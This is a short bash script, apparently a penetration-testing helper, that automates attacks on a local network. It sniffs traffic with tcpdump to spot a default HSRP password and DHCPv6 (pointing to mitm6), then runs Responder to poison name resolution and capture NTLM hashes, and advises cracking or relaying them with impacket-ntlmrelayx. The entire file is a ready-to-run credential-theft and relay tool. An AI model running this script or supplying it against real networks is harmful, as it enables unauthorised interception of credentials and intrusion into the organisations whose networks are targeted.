#!/usr/bin/env bash

if [ "$#" -ne 1 ]; then
  echo "You must specify a network adapter as an argument."
  echo "Usage: $0 [network adapter]"
  exit 1
fi

echo "[+] Please wait; capturing network traffic on $1 for 2.5 minutes."
sudo timeout 150 tcpdump -i "$1" -s0 -w packetcapture.pcap

echo "[+] Testing for default HSRP password 'cisco'..."
tcpdump -XX -r packetcapture.pcap 'udp port 1985 or udp port 2029' | grep -B4 cisco

echo "[+] Testing for DHCPv6."
echo "[+] If detected, try mitm6!"
tcpdump -r packetcapture.pcap '(udp port 546 or 547) or icmp6'
sudo rm packetcapture.pcap

echo "[+] Please wait; running Responder for 5 minutes."
echo "[+] If hashes are captured, crack them or run Responder again with impacket-ntlmrelayx to relay."
responder=$(sudo timeout 300 responder -I "$1")
cat /usr/share/responder/logs/Responder-Session.log
